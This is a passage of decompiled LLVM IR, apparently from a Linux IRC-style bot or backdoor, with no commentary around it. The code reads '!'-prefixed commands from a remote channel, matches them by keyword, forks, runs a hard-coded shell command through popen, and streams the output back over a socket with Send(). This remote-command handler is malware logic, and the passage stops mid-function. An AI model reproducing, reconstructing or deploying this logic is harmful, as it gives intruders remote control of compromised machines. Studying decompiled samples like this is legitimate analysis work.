dec_label_pc_8053d19:                             ; preds = %dec_label_pc_8053cf2, %dec_label_pc_8053d16
  %storemerge11 = phi i32 [ %v4_8053d16, %dec_label_pc_8053d16 ], [ 0, %dec_label_pc_8053cf2 ]
  store i32 %storemerge11, i32* %edx.global-to-local, align 4
  store i32 %v4_8053ca2, i32* @edi, align 4
  %v3_8053d33 = call i32 @_strlen(i8* %arg2)
  %v7_8053d3a = icmp ult i32 %storemerge11, %v3_8053d33
  %v1_8053d3c = icmp eq i1 %v7_8053d3a, false
  %.pre188 = add i32 %storemerge11, %v4_8053ca2
  br i1 %v1_8053d3c, label %dec_label_pc_8053d19.dec_label_pc_8053d4a_crit_edge, label %dec_label_pc_8053d3e

dec_label_pc_8053d19.dec_label_pc_8053d4a_crit_edge: ; preds = %dec_label_pc_8053d19
  %.pre192 = inttoptr i32 %.pre188 to i8*
  br label %dec_label_pc_8053d4a

dec_label_pc_8053d3e:                             ; preds = %dec_label_pc_8053d19
  %v1_8053d44 = inttoptr i32 %.pre188 to i8*
  %v2_8053d44 = load i8, i8* %v1_8053d44, align 1
  %v10_8053d46 = icmp eq i8 %v2_8053d44, 33
  %v1_8053d48 = icmp eq i1 %v10_8053d46, false
  br i1 %v1_8053d48, label %dec_label_pc_8053d16, label %dec_label_pc_8053d4a

dec_label_pc_8053d4a:                             ; preds = %dec_label_pc_8053d19.dec_label_pc_8053d4a_crit_edge, %dec_label_pc_8053d3e
  %v1_8053d50.pre-phi = phi i8* [ %.pre192, %dec_label_pc_8053d19.dec_label_pc_8053d4a_crit_edge ], [ %v1_8053d44, %dec_label_pc_8053d3e ]
  store i8 0, i8* %v1_8053d50.pre-phi, align 1
  %v3_8053d53 = load i8*, i8** %stack_var_-64, align 4
  %v4_8053d53 = ptrtoint i8* %v3_8053d53 to i32
  %v2_8053d56 = load i8, i8* %v3_8053d53, align 1
  %v3_8053d56 = zext i8 %v2_8053d56 to i32
  %v5_8053d56 = and i32 %v4_8053d53, -256
  %v6_8053d56 = or i32 %v3_8053d56, %v5_8053d56
  %v10_8053d58 = icmp eq i8 %v2_8053d56, 33
  %v1_8053d5a = icmp eq i1 %v10_8053d58, false
  br i1 %v1_8053d5a, label %dec_label_pc_8054ab3, label %dec_label_pc_8053d60

dec_label_pc_8053d60:                             ; preds = %dec_label_pc_8053d4a
  %v0_8053d60 = load i8*, i8** @global_var_807e0f8.299, align 4
  %v1_8053d60 = ptrtoint i8* %v0_8053d60 to i32
  %v4_8053d6c = call i32 @__GI_strcasecmp(i8* %tmp111, i32 %v1_8053d60)
  %v1_8053d74 = icmp eq i32 %v4_8053d6c, 0
  %v1_8053d76 = icmp eq i1 %v1_8053d74, false
  br i1 %v1_8053d76, label %dec_label_pc_8054ab3, label %dec_label_pc_8053d7c

dec_label_pc_8053d7c:                             ; preds = %dec_label_pc_8053d60
  %v2_8053d7c = ptrtoint i32* %stack_var_-1144 to i32
  store i32 %v2_8053d7c, i32* %edx.global-to-local, align 4
  %v4_8053d8e = bitcast i32* %stack_var_-1144 to i8*
  %v5_8053d8e = call i32 @__GI_memset(i8* %v4_8053d8e, i32 0, i32 1024)
  %v3_8053d9d = load i8*, i8** %stack_var_-64, align 4
  %v4_8053d9d = ptrtoint i8* %v3_8053d9d to i32
  %v5_8053d9d = add i32 %v4_8053d9d, 1
  %v22_8053d9d = inttoptr i32 %v5_8053d9d to i8*
  store i8* %v22_8053d9d, i8** %stack_var_-64, align 4
  br label %dec_label_pc_8053dac

dec_label_pc_8053da9:                             ; preds = %dec_label_pc_8053dd1
  %v4_8053da9 = add i32 %storemerge10, 1
  br label %dec_label_pc_8053dac

dec_label_pc_8053dac:                             ; preds = %dec_label_pc_8053d7c, %dec_label_pc_8053da9
  %v3_8053daf = phi i8* [ %v4_8053de0.pre, %dec_label_pc_8053da9 ], [ %v22_8053d9d, %dec_label_pc_8053d7c ]
  %storemerge10 = phi i32 [ %v4_8053da9, %dec_label_pc_8053da9 ], [ 0, %dec_label_pc_8053d7c ]
  store i32 %storemerge10, i32* %edx.global-to-local, align 4
  %v4_8053daf = ptrtoint i8* %v3_8053daf to i32
  store i1 false, i1* @df, align 1
  store i32 %v4_8053daf, i32* @edi, align 4
  %v3_8053dc6 = call i32 @_strlen(i8* %v3_8053daf)
  %v7_8053dcd = icmp ult i32 %storemerge10, %v3_8053dc6
  %v1_8053dcf = icmp eq i1 %v7_8053dcd, false
  %v4_8053de0.pre = load i8*, i8** %stack_var_-64, align 4
  %.pre193 = ptrtoint i8* %v4_8053de0.pre to i32
  %.pre194 = add i32 %.pre193, %storemerge10
  br i1 %v1_8053dcf, label %dec_label_pc_8053dac.dec_label_pc_8053ddd_crit_edge, label %dec_label_pc_8053dd1

dec_label_pc_8053dac.dec_label_pc_8053ddd_crit_edge: ; preds = %dec_label_pc_8053dac
  %.pre195 = inttoptr i32 %.pre194 to i8*
  br label %dec_label_pc_8053ddd

dec_label_pc_8053dd1:                             ; preds = %dec_label_pc_8053dac
  %v1_8053dd7 = inttoptr i32 %.pre194 to i8*
  %v2_8053dd7 = load i8, i8* %v1_8053dd7, align 1
  %v7_8053dd9 = icmp eq i8 %v2_8053dd7, 32
  %v1_8053ddb = icmp eq i1 %v7_8053dd9, false
  br i1 %v1_8053ddb, label %dec_label_pc_8053da9, label %dec_label_pc_8053ddd

dec_label_pc_8053ddd:                             ; preds = %dec_label_pc_8053dac.dec_label_pc_8053ddd_crit_edge, %dec_label_pc_8053dd1
  %v1_8053de3.pre-phi = phi i8* [ %.pre195, %dec_label_pc_8053dac.dec_label_pc_8053ddd_crit_edge ], [ %v1_8053dd7, %dec_label_pc_8053dd1 ]
  store i8 0, i8* %v1_8053de3.pre-phi, align 1
  %v0_8053de6 = load i32, i32* @global_var_807cb6c.53, align 4
  %v3_8053def = load i8*, i8** %stack_var_-64, align 4
  %v4_8053df2 = call i32 @strwildmatch(i8* %v3_8053def, i32 %v0_8053de6)
  %v1_8053dfa = icmp eq i32 %v4_8053df2, 0
  %v1_8053dfc = icmp eq i1 %v1_8053dfa, false
  br i1 %v1_8053dfc, label %dec_label_pc_8054ab3, label %dec_label_pc_8053e02

dec_label_pc_8053e02:                             ; preds = %dec_label_pc_8053ddd
  %v4_8053e05 = load i8*, i8** %stack_var_-64, align 4
  %v5_8053e05 = ptrtoint i8* %v4_8053e05 to i32
  %v6_8053e05 = add i32 %storemerge10, 1
  %v1_8053e08 = add i32 %v6_8053e05, %v5_8053e05
  store i32 %v1_8053e08, i32* @eax, align 4
  %v5_8053e09 = inttoptr i32 %v1_8053e08 to i8*
  store i8* %v5_8053e09, i8** %stack_var_-64, align 4
  %v5_8053e19 = call i32 @__GI_strncmp(i8* %v5_8053e09, i32 ptrtoint ([5 x i8]* @global_var_806baf8.595 to i32), i32 4)
  store i32 %v5_8053e19, i32* @eax, align 4
  %v1_8053e21 = icmp eq i32 %v5_8053e19, 0
  %v1_8053e23 = icmp eq i1 %v1_8053e21, false
  br i1 %v1_8053e23, label %dec_label_pc_8053e60, label %dec_label_pc_8053e25

dec_label_pc_8053e25:                             ; preds = %dec_label_pc_8053e02
  %v0_8053e25 = load i8, i8* @global_var_8074070.28, align 16
  %v4_8053e2a = icmp eq i8 %v0_8053e25, 0
  br i1 %v4_8053e2a, label %dec_label_pc_8053e46, label %dec_label_pc_8053e2e

dec_label_pc_8053e2e:                             ; preds = %dec_label_pc_8053e25
  %v3_8053e3c = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8068af4.30 to i32))
  store i32 %v3_8053e3c, i32* @eax, align 4
  br label %dec_label_pc_8053e60

dec_label_pc_8053e46:                             ; preds = %dec_label_pc_8053e25
  %v3_8053e58 = call i32 @Send(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_806bafd.596 to i32))
  store i32 %v3_8053e58, i32* @eax, align 4
  br label %dec_label_pc_8053e60

dec_label_pc_8053e60:                             ; preds = %dec_label_pc_8053e02, %dec_label_pc_8053e2e, %dec_label_pc_8053e46
  %v3_8053e6a = load i8*, i8** %stack_var_-64, align 4
  %v5_8053e6d = call i32 @__GI_strncmp(i8* %v3_8053e6a, i32 ptrtoint ([4 x i8]* @global_var_806bb01.597 to i32), i32 3)
  store i32 %v5_8053e6d, i32* @eax, align 4
  %v1_8053e75 = icmp eq i32 %v5_8053e6d, 0
  %v1_8053e77 = icmp eq i1 %v1_8053e75, false
  br i1 %v1_8053e77, label %dec_label_pc_8053f6a, label %dec_label_pc_8053e7d

dec_label_pc_8053e7d:                             ; preds = %dec_label_pc_8053e60
  %v1_8053e83 = call i32 @mfork(i32 %v4_8053ca2)
  %v1_8053e8b = icmp eq i32 %v1_8053e83, 0
  %v1_8053e8d = icmp eq i1 %v1_8053e8b, false
  br i1 %v1_8053e8d, label %dec_label_pc_8054ab3, label %dec_label_pc_8053e93

dec_label_pc_8053e93:                             ; preds = %dec_label_pc_8053e7d
  %v2_8053e9d = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8053ea4 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8053ea4 = call i32 @__GI_memset(i8* %v4_8053ea4, i32 0, i32 1024)
  %v3_8053ec2 = call i32 @sprintf(i32 %v2_8053e9d, i32 ptrtoint ([69 x i8]* @global_var_806bb08.598 to i32))
  store i32 %v2_8053e9d, i32* @eax, align 4
  %v4_8053ed9 = call i32 @popen(i32 %v2_8053e9d, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  %v1_8053f46 = inttoptr i32 %v4_8053ed9 to i32*
  %v2_8053f46181 = call i32 @feof(i32* %v1_8053f46)
  %v1_8053f4e182 = icmp eq i32 %v2_8053f46181, 0
  br i1 %v1_8053f4e182, label %dec_label_pc_8053ee6, label %dec_label_pc_8053f52

dec_label_pc_8053ee6:                             ; preds = %dec_label_pc_8053e93, %dec_label_pc_8053ee6
  %v5_8053ef7 = call i32 @__GI_memset(i8* %v4_8053ea4, i32 0, i32 1024)
  %v4_8053f11 = call i32 @fgets(i32 %v2_8053e9d, i32 1024, i32 %v4_8053ed9)
  %v3_8053f2b = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32))
  %v1_8053f38 = call i32 @sleep(i32 1)
  %v2_8053f46 = call i32 @feof(i32* %v1_8053f46)
  %v1_8053f4e = icmp eq i32 %v2_8053f46, 0
  br i1 %v1_8053f4e, label %dec_label_pc_8053ee6, label %dec_label_pc_8053f52

dec_label_pc_8053f52:                             ; preds = %dec_label_pc_8053ee6, %dec_label_pc_8053e93
  %v1_8053f58 = call i32 @pclose(i32 %v4_8053ed9)
  %v1_8053f65 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8053f65, i32* @eax, align 4
  br label %dec_label_pc_8053f6a

dec_label_pc_8053f6a:                             ; preds = %dec_label_pc_8053e60, %dec_label_pc_8053f52
  %v3_8053f74 = load i8*, i8** %stack_var_-64, align 4
  %v5_8053f77 = call i32 @__GI_strncmp(i8* %v3_8053f74, i32 ptrtoint ([5 x i8]* @global_var_806bb5c.600 to i32), i32 4)
  store i32 %v5_8053f77, i32* @eax, align 4
  %v1_8053f7f = icmp eq i32 %v5_8053f77, 0
  %v1_8053f81 = icmp eq i1 %v1_8053f7f, false
  br i1 %v1_8053f81, label %dec_label_pc_8054074, label %dec_label_pc_8053f87

dec_label_pc_8053f87:                             ; preds = %dec_label_pc_8053f6a
  %v1_8053f8d = call i32 @mfork(i32 %v4_8053ca2)
  %v1_8053f95 = icmp eq i32 %v1_8053f8d, 0
  %v1_8053f97 = icmp eq i1 %v1_8053f95, false
  br i1 %v1_8053f97, label %dec_label_pc_8054ab3, label %dec_label_pc_8053f9d

dec_label_pc_8053f9d:                             ; preds = %dec_label_pc_8053f87
  %v2_8053fa7 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8053fae = bitcast i32* %stack_var_-2168 to i8*
  %v5_8053fae = call i32 @__GI_memset(i8* %v4_8053fae, i32 0, i32 1024)
  %v3_8053fcc = call i32 @sprintf(i32 %v2_8053fa7, i32 ptrtoint ([100 x i8]* @global_var_806bb64.601 to i32))
  store i32 %v2_8053fa7, i32* @eax, align 4
  %v4_8053fe3 = call i32 @popen(i32 %v2_8053fa7, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  %v1_8054050 = inttoptr i32 %v4_8053fe3 to i32*
  %v2_8054050179 = call i32 @feof(i32* %v1_8054050)
  %v1_8054058180 = icmp eq i32 %v2_8054050179, 0
  br i1 %v1_8054058180, label %dec_label_pc_8053ff0, label %dec_label_pc_805405c

dec_label_pc_8053ff0:                             ; preds = %dec_label_pc_8053f9d, %dec_label_pc_8053ff0
  %v5_8054001 = call i32 @__GI_memset(i8* %v4_8053fae, i32 0, i32 1024)
  %v4_805401b = call i32 @fgets(i32 %v2_8053fa7, i32 1024, i32 %v4_8053fe3)
  %v3_8054035 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32))
  %v1_8054042 = call i32 @sleep(i32 1)
  %v2_8054050 = call i32 @feof(i32* %v1_8054050)
  %v1_8054058 = icmp eq i32 %v2_8054050, 0
  br i1 %v1_8054058, label %dec_label_pc_8053ff0, label %dec_label_pc_805405c

dec_label_pc_805405c:                             ; preds = %dec_label_pc_8053ff0, %dec_label_pc_8053f9d
  %v1_8054062 = call i32 @pclose(i32 %v4_8053fe3)
  %v1_805406f = call i32 @__GI_exit(i32 0)
  store i32 %v1_805406f, i32* @eax, align 4
  br label %dec_label_pc_8054074

dec_label_pc_8054074:                             ; preds = %dec_label_pc_8053f6a, %dec_label_pc_805405c
  %v3_805407e = load i8*, i8** %stack_var_-64, align 4
  %v5_8054081 = call i32 @__GI_strncmp(i8* %v3_805407e, i32 ptrtoint ([7 x i8]* @global_var_806bbc8.602 to i32), i32 6)
  store i32 %v5_8054081, i32* @eax, align 4
  %v1_8054089 = icmp eq i32 %v5_8054081, 0
  %v1_805408b = icmp eq i1 %v1_8054089, false
  br i1 %v1_805408b, label %dec_label_pc_805417e, label %dec_label_pc_8054091

dec_label_pc_8054091:                             ; preds = %dec_label_pc_8054074
  %v1_8054097 = call i32 @mfork(i32 %v4_8053ca2)
  %v1_805409f = icmp eq i32 %v1_8054097, 0
  %v1_80540a1 = icmp eq i1 %v1_805409f, false
  br i1 %v1_80540a1, label %dec_label_pc_8054ab3, label %dec_label_pc_80540a7

dec_label_pc_80540a7:                             ; preds = %dec_label_pc_8054091
  %v2_80540b1 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_80540b8 = bitcast i32* %stack_var_-2168 to i8*
  %v5_80540b8 = call i32 @__GI_memset(i8* %v4_80540b8, i32 0, i32 1024)
  %v3_80540d6 = call i32 @sprintf(i32 %v2_80540b1, i32 ptrtoint ([330 x i8]* @global_var_806bbd0.603 to i32))
  store i32 %v2_80540b1, i32* @eax, align 4
  %v4_80540ed = call i32 @popen(i32 %v2_80540b1, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  %v1_805415a = inttoptr i32 %v4_80540ed to i32*
  %v2_805415a177 = call i32 @feof(i32* %v1_805415a)
  %v1_8054162178 = icmp eq i32 %v2_805415a177, 0
  br i1 %v1_8054162178, label %dec_label_pc_80540fa, label %dec_label_pc_8054166

dec_label_pc_80540fa:                             ; preds = %dec_label_pc_80540a7, %dec_label_pc_80540fa
  %v5_805410b = call i32 @__GI_memset(i8* %v4_80540b8, i32 0, i32 1024)
  %v4_8054125 = call i32 @fgets(i32 %v2_80540b1, i32 1024, i32 %v4_80540ed)
  %v3_805413f = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32))
  %v1_805414c = call i32 @sleep(i32 1)
  %v2_805415a = call i32 @feof(i32* %v1_805415a)
  %v1_8054162 = icmp eq i32 %v2_805415a, 0
  br i1 %v1_8054162, label %dec_label_pc_80540fa, label %dec_label_pc_8054166

dec_label_pc_8054166:                             ; preds = %dec_label_pc_80540fa, %dec_label_pc_80540a7
  %v1_805416c = call i32 @pclose(i32 %v4_80540ed)
  %v1_8054179 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8054179, i32* @eax, align 4
  br label %dec_label_pc_805417e

dec_label_pc_805417e:                             ; preds = %dec_label_pc_8054074, %dec_label_pc_8054166
  %v3_8054188 = load i8*, i8** %stack_var_-64, align 4
  %v5_805418b = call i32 @__GI_strncmp(i8* %v3_8054188, i32 ptrtoint ([8 x i8]* @global_var_806bd1a.604 to i32), i32 7)
  store i32 %v5_805418b, i32* @eax, align 4
  %v1_8054193 = icmp eq i32 %v5_805418b, 0
  %v1_8054195 = icmp eq i1 %v1_8054193, false
  br i1 %v1_8054195, label %dec_label_pc_8054288, label %dec_label_pc_805419b

dec_label_pc_805419b:                             ; preds = %dec_label_pc_805417e
  %v1_80541a1 = call i32 @mfork(i32 %v4_8053ca2)
  %v1_80541a9 = icmp eq i32 %v1_80541a1, 0
  %v1_80541ab = icmp eq i1 %v1_80541a9, false
  br i1 %v1_80541ab, label %dec_label_pc_8054ab3, label %dec_label_pc_80541b1

dec_label_pc_80541b1:                             ; preds = %dec_label_pc_805419b
  %v2_80541bb = ptrtoint i32* %stack_var_-2168 to i32
  %v4_80541c2 = bitcast i32* %stack_var_-2168 to i8*
  %v5_80541c2 = call i32 @__GI_memset(i8* %v4_80541c2, i32 0, i32 1024)
  %v3_80541e0 = call i32 @sprintf(i32 %v2_80541bb, i32 ptrtoint ([668 x i8]* @global_var_806bd24.605 to i32))
  store i32 %v2_80541bb, i32* @eax, align 4
  %v4_80541f7 = call i32 @popen(i32 %v2_80541bb, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  %v1_8054264 = inttoptr i32 %v4_80541f7 to i32*
  %v2_8054264175 = call i32 @feof(i32* %v1_8054264)
  %v1_805426c176 = icmp eq i32 %v2_8054264175, 0
  br i1 %v1_805426c176, label %dec_label_pc_8054204, label %dec_label_pc_8054270

dec_label_pc_8054204:                             ; preds = %dec_label_pc_80541b1, %dec_label_pc_8054204
  %v5_8054215 = call i32 @__GI_memset(i8* %v4_80541c2, i32 0, i32 1024)
  %v4_805422f = call i32 @fgets(i32 %v2_80541bb, i32 1024, i32 %v4_80541f7)
  %v3_8054249 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32))
  %v1_8054256 = call i32 @sleep(i32 1)
  %v2_8054264 = call i32 @feof(i32* %v1_8054264)
  %v1_805426c = icmp eq i32 %v2_8054264, 0
  br i1 %v1_805426c, label %dec_label_pc_8054204, label %dec_label_pc_8054270

dec_label_pc_8054270:                             ; preds = %dec_label_pc_8054204, %dec_label_pc_80541b1
  %v1_8054276 = call i32 @pclose(i32 %v4_80541f7)
  %v1_8054283 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8054283, i32* @eax, align 4
  br label %dec_label_pc_8054288

dec_label_pc_8054288:                             ; preds = %dec_label_pc_805417e, %dec_label_pc_8054270
  %v3_8054292 = load i8*, i8** %stack_var_-64, align 4
  %v5_8054295 = call i32 @__GI_strncmp(i8* %v3_8054292, i32 ptrtoint ([9 x i8]* @global_var_806bfc0.606 to i32), i32 8)
  store i32 %v5_8054295, i32* @eax, align 4
  %v1_805429d = icmp eq i32 %v5_8054295, 0
  %v1_805429f = icmp eq i1 %v1_805429d, false
  br i1 %v1_805429f, label %dec_label_pc_8054392, label %dec_label_pc_80542a5

dec_label_pc_80542a5:                             ; preds = %dec_label_pc_8054288
  %v1_80542ab = call i32 @mfork(i32 %v4_8053ca2)
  %v1_80542b3 = icmp eq i32 %v1_80542ab, 0
  %v1_80542b5 = icmp eq i1 %v1_80542b3, false
  br i1 %v1_80542b5, label %dec_label_pc_8054ab3, label %dec_label_pc_80542bb

dec_label_pc_80542bb:                             ; preds = %dec_label_pc_80542a5
  %v2_80542c5 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_80542cc = bitcast i32* %stack_var_-2168 to i8*
  %v5_80542cc = call i32 @__GI_memset(i8* %v4_80542cc, i32 0, i32 1024)
  %v3_80542ea = call i32 @sprintf(i32 %v2_80542c5, i32 ptrtoint ([389 x i8]* @global_var_806bfcc.607 to i32))
  store i32 %v2_80542c5, i32* @eax, align 4
  %v4_8054301 = call i32 @popen(i32 %v2_80542c5, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  %v1_805436e = inttoptr i32 %v4_8054301 to i32*
  %v2_805436e173 = call i32 @feof(i32* %v1_805436e)
  %v1_8054376174 = icmp eq i32 %v2_805436e173, 0
  br i1 %v1_8054376174, label %dec_label_pc_805430e, label %dec_label_pc_805437a

dec_label_pc_805430e:                             ; preds = %dec_label_pc_80542bb, %dec_label_pc_805430e
  %v5_805431f = call i32 @__GI_memset(i8* %v4_80542cc, i32 0, i32 1024)
  %v4_8054339 = call i32 @fgets(i32 %v2_80542c5, i32 1024, i32 %v4_8054301)
  %v3_8054353 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32))
  %v1_8054360 = call i32 @sleep(i32 1)
  %v2_805436e = call i32 @feof(i32* %v1_805436e)
  %v1_8054376 = icmp eq i32 %v2_805436e, 0
  br i1 %v1_8054376, label %dec_label_pc_805430e, label %dec_label_pc_805437a

dec_label_pc_805437a:                             ; preds = %dec_label_pc_805430e, %dec_label_pc_80542bb
  %v1_8054380 = call i32 @pclose(i32 %v4_8054301)
  %v1_805438d = call i32 @__GI_exit(i32 0)
  store i32 %v1_805438d, i32* @eax, align 4
  br label %dec_label_pc_8054392

dec_label_pc_8054392:                             ; preds = %dec_label_pc_8054288, %dec_label_pc_805437a
  %v3_805439c = load i8*, i8** %stack_var_-64, align 4
  %v5_805439f = call i32 @__GI_strncmp(i8* %v3_805439c, i32 ptrtoint ([11 x i8]* @global_var_806c151.608 to i32), i32 10)
  store i32 %v5_805439f, i32* @eax, align 4
  %v1_80543a7 = icmp eq i32 %v5_805439f, 0
  %v1_80543a9 = icmp eq i1 %v1_80543a7, false
  br i1 %v1_80543a9, label %dec_label_pc_805449c, label %dec_label_pc_80543af

dec_label_pc_80543af:                             ; preds = %dec_label_pc_8054392
  %v1_80543b5 = call i32 @mfork(i32 %v4_8053ca2)
  %v1_80543bd = icmp eq i32 %v1_80543b5, 0
  %v1_80543bf = icmp eq i1 %v1_80543bd, false
  br i1 %v1_80543bf, label %dec_label_pc_8054ab3, label %dec_label_pc_80543c5

dec_label_pc_80543c5:                             ; preds = %dec_label_pc_80543af
  %v2_80543cf = ptrtoint i32* %stack_var_-2168 to i32
  %v4_80543d6 = bitcast i32* %stack_var_-2168 to i8*
  %v5_80543d6 = call i32 @__GI_memset(i8* %v4_80543d6, i32 0, i32 1024)
  %v3_80543f4 = call i32 @sprintf(i32 %v2_80543cf, i32 ptrtoint ([371 x i8]* @global_var_806c15c.609 to i32))
  store i32 %v2_80543cf, i32* @eax, align 4
  %v4_805440b = call i32 @popen(i32 %v2_80543cf, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  %v1_8054478 = inttoptr i32 %v4_805440b to i32*
  %v2_8054478171 = call i32 @feof(i32* %v1_8054478)
  %v1_8054480172 = icmp eq i32 %v2_8054478171, 0
  br i1 %v1_8054480172, label %dec_label_pc_8054418, label %dec_label_pc_8054484

dec_label_pc_8054418:                             ; preds = %dec_label_pc_80543c5, %dec_label_pc_8054418
  %v5_8054429 = call i32 @__GI_memset(i8* %v4_80543d6, i32 0, i32 1024)
  %v4_8054443 = call i32 @fgets(i32 %v2_80543cf, i32 1024, i32 %v4_805440b)
  %v3_805445d = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32))
  %v1_805446a = call i32 @sleep(i32 1)
  %v2_8054478 = call i32 @feof(i32* %v1_8054478)
  %v1_8054480 = icmp eq i32 %v2_8054478, 0
  br i1 %v1_8054480, label %dec_label_pc_8054418, label %dec_label_pc_8054484

dec_label_pc_8054484:                             ; preds = %dec_label_pc_8054418, %dec_label_pc_80543c5
  %v1_805448a = call i32 @pclose(i32 %v4_805440b)
  %v1_8054497 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8054497, i32* @eax, align 4
  br label %dec_label_pc_805449c

dec_label_pc_805449c:                             ; preds = %dec_label_pc_8054392, %dec_label_pc_8054484
  %v3_80544a6 = load i8*, i8** %stack_var_-64, align 4
  %v5_80544a9 = call i32 @__GI_strncmp(i8* %v3_80544a6, i32 ptrtoint ([8 x i8]* @global_var_806c2cf.610 to i32), i32 7)
  store i32 %v5_80544a9, i32* @eax, align 4
  %v1_80544b1 = icmp eq i32 %v5_80544a9, 0
  %v1_80544b3 = icmp eq i1 %v1_80544b1, false
  br i1 %v1_80544b3, label %dec_label_pc_80545a6, label %dec_label_pc_80544b9

dec_label_pc_80544b9:                             ; preds = %dec_label_pc_805449c
  %v1_80544bf = call i32 @mfork(i32 %v4_8053ca2)
  %v1_80544c7 = icmp eq i32 %v1_80544bf, 0
  %v1_80544c9 = icmp eq i1 %v1_80544c7, false
  br i1 %v1_80544c9, label %dec_label_pc_8054ab3, label %dec_label_pc_80544cf

dec_label_pc_80544cf:                             ; preds = %dec_label_pc_80544b9
  %v2_80544d9 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_80544e0 = bitcast i32* %stack_var_-2168 to i8*
  %v5_80544e0 = call i32 @__GI_memset(i8* %v4_80544e0, i32 0, i32 1024)
  %v3_80544fe = call i32 @sprintf(i32 %v2_80544d9, i32 ptrtoint ([235 x i8]* @global_var_806c2d8.611 to i32))
  store i32 %v2_80544d9, i32* @eax, align 4
  %v4_8054515 = call i32 @popen(i32 %v2_80544d9, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  %v1_8054582 = inttoptr i32 %v4_8054515 to i32*
  %v2_8054582169 = call i32 @feof(i32* %v1_8054582)
  %v1_805458a170 = icmp eq i32 %v2_8054582169, 0
  br i1 %v1_805458a170, label %dec_label_pc_8054522, label %dec_label_pc_805458e

dec_label_pc_8054522:                             ; preds = %dec_label_pc_80544cf, %dec_label_pc_8054522
  %v5_8054533 = call i32 @__GI_memset(i8* %v4_80544e0, i32 0, i32 1024)
  %v4_805454d = call i32 @fgets(i32 %v2_80544d9, i32 1024, i32 %v4_8054515)
  %v3_8054567 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32))
  %v1_8054574 = call i32 @sleep(i32 1)
  %v2_8054582 = call i32 @feof(i32* %v1_8054582)
  %v1_805458a = icmp eq i32 %v2_8054582, 0
  br i1 %v1_805458a, label %dec_label_pc_8054522, label %dec_label_pc_805458e

dec_label_pc_805458e:                             ; preds = %dec_label_pc_8054522, %dec_label_pc_80544cf
  %v1_8054594 = call i32 @pclose(i32 %v4_8054515)
  %v1_80545a1 = call i32 @__GI_exit(i32 0)
  store i32 %v1_80545a1, i32* @eax, align 4
  br label %dec_label_pc_80545a6

dec_label_pc_80545a6:                             ; preds = %dec_label_pc_805449c, %dec_label_pc_805458e
  %v3_80545b0 = load i8*, i8** %stack_var_-64, align 4
  %v5_80545b3 = call i32 @__GI_strncmp(i8* %v3_80545b0, i32 ptrtoint ([8 x i8]* @global_var_806c3c3.612 to i32), i32 6)
  store i32 %v5_80545b3, i32* @eax, align 4
  %v1_80545bb = icmp eq i32 %v5_80545b3, 0
  %v1_80545bd = icmp eq i1 %v1_80545bb, false
  br i1 %v1_80545bd, label %dec_label_pc_80546b0, label %dec_label_pc_80545c3

dec_label_pc_80545c3:                             ; preds = %dec_label_pc_80545a6
  %v1_80545c9 = call i32 @mfork(i32 %v4_8053ca2)
  %v1_80545d1 = icmp eq i32 %v1_80545c9, 0
  %v1_80545d3 = icmp eq i1 %v1_80545d1, false
  br i1 %v1_80545d3, label %dec_label_pc_8054ab3, label %dec_label_pc_80545d9

dec_label_pc_80545d9:                             ; preds = %dec_label_pc_80545c3
  %v2_80545e3 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_80545ea = bitcast i32* %stack_var_-2168 to i8*
  %v5_80545ea = call i32 @__GI_memset(i8* %v4_80545ea, i32 0, i32 1024)
  %v3_8054608 = call i32 @sprintf(i32 %v2_80545e3, i32 ptrtoint ([114 x i8]* @global_var_806c3cc.613 to i32))
  store i32 %v2_80545e3, i32* @eax, align 4
  %v4_805461f = call i32 @popen(i32 %v2_80545e3, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  %v1_805468c = inttoptr i32 %v4_805461f to i32*
  %v2_805468c167 = call i32 @feof(i32* %v1_805468c)
  %v1_8054694168 = icmp eq i32 %v2_805468c167, 0
  br i1 %v1_8054694168, label %dec_label_pc_805462c, label %dec_label_pc_8054698

dec_label_pc_805462c:                             ; preds = %dec_label_pc_80545d9, %dec_label_pc_805462c
  %v5_805463d = call i32 @__GI_memset(i8* %v4_80545ea, i32 0, i32 1024)
  %v4_8054657 = call i32 @fgets(i32 %v2_80545e3, i32 1024, i32 %v4_805461f)
  %v3_8054671 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32))
  %v1_805467e = call i32 @sleep(i32 1)
  %v2_805468c = call i32 @feof(i32* %v1_805468c)
  %v1_8054694 = icmp eq i32 %v2_805468c, 0
  br i1 %v1_8054694, label %dec_label_pc_805462c, label %dec_label_pc_8054698

